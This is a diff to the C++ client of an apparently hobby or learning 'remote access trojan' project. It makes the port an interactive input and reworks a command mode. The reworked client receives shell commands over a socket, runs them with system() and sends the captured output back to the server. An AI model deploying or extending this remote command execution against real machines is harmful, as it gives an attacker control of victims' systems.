@@ -16,7 +16,7 @@
 
 using namespace std;
 
-string FILE_SAVE_PLACE{"/home/dachoa1005/Desktop/RAT/client/recv_files/"};
+string FILE_SAVE_PLACE{"/home/dachoa1005/WorkSpace/RAT/client/recv_files/"};
 
 int main(int argc, char const *argv[])
 {
@@ -26,9 +26,11 @@ int main(int argc, char const *argv[])
     //     exit(0);
     // }
 
-    int portno = 8001; // portnumber
+    // int portno = 8001; // portnumber
     char const *serverIP = "127.0.0.1";
-
+    int portno{0};
+    cout << "Enter port number: ";
+    cin >> portno;
     struct hostent *host = gethostbyname(serverIP);
 
     sockaddr_in sendSockAddr;
@@ -96,25 +98,32 @@ int main(int argc, char const *argv[])
 
         case 3:
         {
-            ifstream file;
-            file.open("temp.txt");
+            fstream file;
             string command;
             while (true)
             {
+                file.open("temp.txt");  
                 memset(msg, 0, sizeof(msg));
                 recv(clientSockfd, msg, sizeof(msg), 0);
-                command = string(msg);
                 if (strcmp(msg, "exit") == 0)
                 {
                     cout << "Exit command" << endl;
                     break;
                 }
                 
+                command = string(msg);
                 cout << "Command: " << command << endl;
                 command = command + " > temp.txt";
                 system(command.c_str());
+                string line;
+                while(getline(file, line))
+                {
+                    cout << line << endl;
+                }
+                file.close();
+                send_file("temp.txt", "temp.txt", clientSockfd);
             }
-
+            cout << "Done" << endl;
             break;
         }
         case 0:
